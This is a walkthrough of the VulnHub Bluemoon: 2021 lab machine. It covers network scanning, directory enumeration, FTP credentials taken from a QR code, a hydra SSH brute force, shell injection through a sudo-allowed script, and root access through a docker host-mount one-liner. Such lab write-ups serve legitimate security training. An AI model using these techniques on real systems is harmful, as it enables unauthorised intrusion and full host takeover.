@@ -1,0 +1,203 @@
+VulnHub BlueMoon Machine Walkthrough
+
+In this walkthrough, I performed penetration testing on the Bluemoon: 2021 vulnerable machine from VulnHub. The objective of this lab is to obtain flags by gaining access to the system and eventually escalating privileges to root.
+
+Step 1 – Finding the Target IP Address
+
+First, I needed to find the IP address of the vulnerable machine on the network.
+
+To do this, I used netdiscover in Kali Linux:
+
+netdiscover
+
+After scanning the network, I identified the target machine IP address.
+
+Step 2 – Checking Network Information
+
+Before starting the scan, I checked my network configuration to identify my IP address and network range.
+
+I used the following command:
+
+ifconfig
+
+This command displays the network interface information, including the IP address assigned to my machine.
+
+From the output, I identified my IP address and determined that my network range was:
+
+192.168.0.0/24
+
+This information is important because it allows me to know which network range to scan when searching for the target machine.
+
+Step 3 – Discovering the Target Machine
+
+Next, I scanned the network to discover active devices and identify the IP address of the Bluemoon machine.
+
+I used the following Nmap command:
+
+nmap -sn 192.168.0.0/24
+
+This command performs a ping scan to find active hosts in the network.
+
+From the results, I found the target machine with the following IP address: 192.168.0.24
+
+After identifying the target IP address, I performed a more detailed scan to gather information about open ports and services running on the machine. nmap -sC -sV -Pn -vv 192.168.0.24
+
+Step 4 – Directory Enumeration
+
+After identifying that port 80 (HTTP) was open from the Nmap scan, I decided to check the website running on the target machine.
+
+First, I opened the target IP address in a web browser:
+
+http://192.168.0.24/
+
+The webpage did not reveal much useful information. Because of that, I decided to perform directory enumeration to discover hidden directories on the web server.
+
+To do this, I used Gobuster with a common wordlist:
+
+gobuster dir -u http://192.168.0.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+After running the scan, I discovered a hidden directory:
+
+/hidden_text
+
+Inside that directory, there was a link that displayed a QR code image.
+
+Step 5 – Decoding the QR Code
+
+I downloaded the QR code image and decoded it using an online QR decoder.
+
+After decoding the QR code, I obtained FTP credentials:
+
+Username: userftp Password: ftpp@ssword
+
+Step 6 – Accessing the FTP Server
+
+Next, I logged into the FTP service using the credentials found from the QR code.
+
+ftp 192.168.0.24
+
+After logging in, I listed the files:
+
+ls
+
+I found some files and downloaded them to my system for further analysis.
+
+There are two files information.txt and p_lists.txt
+
+Download information.txt and p_lists.txt files using get command .
+
+get information.txt
+
+get p_lists.txt
+
+After downloaded the files, to review it you need to use this command such as:
+
+cat information.txt cat p_lists.txt
+
+Now we going to use hydra tool to crack the password of the Robin.
+
+hydra -l robin -P p_lists.txt ssh://192.168.0.24
+
+Login: robin
+
+Password: k4rv3ndh4nh4ck3r
+
+Step 7 – Getting a User Shell
+
+From the files and information gathered, I was able to log in to the system through SSH as the user robin.
+
+ssh robin@192.168.0.24
+
+Now going to obtain The first flag .
+
+ls -al
+
+cat user1.txt
+
+Step 8 – Privilege Escalation (User robin → user jerry)
+
+Next, I checked the sudo permissions to see what commands could be executed.
+
+sudo -l
+
+cd project
+
+ls
+
+cat feedback.sh
+
+Now execute it as a user jerry.
+
+sudo -u jerry /home/robin/project/feedback.sh
+
+Now enter the name as jerry. And enter your feedback as /bin/bash
+
+whoami
+
+pwd
+
+cd /home/jerry
+
+ls
+
+cat user2.txt
+
+Then we will obtain the second flag.
+
+Step 9 – Privilege Escalation to Root
+
+At this stage, I already gained access to the machine as user jerry, but I still did not have root privileges. To continue the privilege escalation process, I first upgraded the shell to make it more interactive.
+
+I used the following Python command to spawn an interactive bash shell:
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+This command improves the shell so it behaves like a normal terminal.
+
+Next, I checked the current user information:
+
+id
+
+From the output, I noticed that the user jerry belongs to the docker group. Being part of the docker group can sometimes allow privilege escalation because Docker containers can be used to access the host system.
+
+To verify the available Docker images, I ran the following command:
+
+docker image ls
+
+The result showed that the Alpine image was available on the system.
+
+Since Docker allows mounting the host filesystem, I used the following command to run the Alpine container and gain root access:
+
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+Explanation of the command:
+
+-v /:/mnt → Mounts the host filesystem to the container
+
+--rm → Removes the container after it stops
+
+-it → Runs the container interactively
+
+chroot /mnt sh → Accesses the host system from inside the container
+
+After executing the command, I obtained a root shell.
+
+To confirm that I had root privileges, I ran:
+
+id
+
+The output showed that the current user is root.
+
+Next, I navigated through the system directories:
+
+cd /home ls
+
+Then I moved to the root directory:
+
+cd /root
+
+Finally, I listed the files and retrieved the root flag:
+
+ls -al cat root.txt
+
+The root.txt file contained the final flag, which confirms that I successfully gained root access and completed the challenge.
